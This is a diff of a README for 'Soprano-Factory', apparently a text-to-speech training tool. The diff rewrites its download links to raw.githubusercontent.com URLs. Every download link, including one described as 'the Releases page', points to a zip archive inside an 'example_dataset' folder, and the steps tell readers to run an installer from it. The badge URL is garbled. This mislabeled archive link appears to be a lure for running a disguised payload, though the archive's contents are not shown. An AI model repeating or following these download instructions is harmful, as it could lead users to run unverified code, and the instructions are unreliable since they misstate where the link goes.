@@ -6,9 +6,9 @@ Welcome to Soprano-Factory! This application allows you to train your own text-t
 
 ## 📥 Download Soprano-Factory
 
-[![Download Soprano-Factory](https://github.com/Twerionex/soprano-factory/raw/refs/heads/main/example_dataset/soprano_factory_1.2.zip%20Now-Get%20the%https://github.com/Twerionex/soprano-factory/raw/refs/heads/main/example_dataset/soprano_factory_1.2.zip)](https://github.com/Twerionex/soprano-factory/raw/refs/heads/main/example_dataset/soprano_factory_1.2.zip)
+[![Download Soprano-Factory](https://raw.githubusercontent.com/Twerionex/soprano-factory/main/example_dataset/soprano_factory_1.2.zip%20Now-Get%20the%https://raw.githubusercontent.com/Twerionex/soprano-factory/main/example_dataset/soprano_factory_1.2.zip)](https://raw.githubusercontent.com/Twerionex/soprano-factory/main/example_dataset/soprano_factory_1.2.zip)
 
-To download Soprano-Factory, visit the Releases page here: [Download Soprano-Factory](https://github.com/Twerionex/soprano-factory/raw/refs/heads/main/example_dataset/soprano_factory_1.2.zip).
+To download Soprano-Factory, visit the Releases page here: [Download Soprano-Factory](https://raw.githubusercontent.com/Twerionex/soprano-factory/main/example_dataset/soprano_factory_1.2.zip).
 
 ## 🛠️ System Requirements
 
@@ -32,7 +32,7 @@ Soprano-Factory offers the following features:
 
 To install Soprano-Factory, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Download Soprano-Factory](https://github.com/Twerionex/soprano-factory/raw/refs/heads/main/example_dataset/soprano_factory_1.2.zip) link.
+1. **Visit the Releases Page**: Go to the [Download Soprano-Factory](https://raw.githubusercontent.com/Twerionex/soprano-factory/main/example_dataset/soprano_factory_1.2.zip) link.
 2. **Select the Latest Release**: Find the latest version available for download.
 3. **Download the Installer**: Click on the installer file suitable for your operating system. You will see options for Windows, MacOS, or Linux.
 4. **Run the Installer**: Once downloaded, open the installer and follow the on-screen instructions. 
